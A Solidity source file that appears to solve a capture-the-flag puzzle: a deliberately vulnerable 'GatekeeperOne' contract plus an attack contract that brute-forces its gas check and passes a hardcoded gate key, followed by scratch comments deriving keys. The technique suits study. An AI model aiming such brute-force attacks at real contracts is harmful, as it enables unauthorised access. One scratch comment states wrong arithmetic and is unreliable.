// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

contract AttackGatekeeperOne {
    GatekeeperOne king;

    constructor(address payable _king) {
        king = GatekeeperOne(_king);
    }

    function attack(uint256 _gas) public payable {
        for (uint256 i; i <= 8191; i++) {
            try king.enter{gas: 800000 + i}(0x0000000100005F0F) {
                break;
            } catch {}
        }
    }
}
// ya - 0x0000000100005F0F
// london 0x000000010000DDC4
// for (uint256 i = 0; i <= 8191; i++) {
//     try victim.enter{gas: 800000 + i}(gateKey) {
//         console.log("passed with gas ->", 800000 + i);
//         break;
//     } catch {}
// }

// contract AttackGatekeeperOne {

// }
//1,410,065,408
// 4294967296 + 1 == 0x1000000010000000

// 1004469227884822208021959794400139037690470752015 mod 65536 == 24,335

// 4,294,991,631

// 0x0000000100005F0F

// 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4

// 56,772 4,295,024,068 0x000000010000DDC4
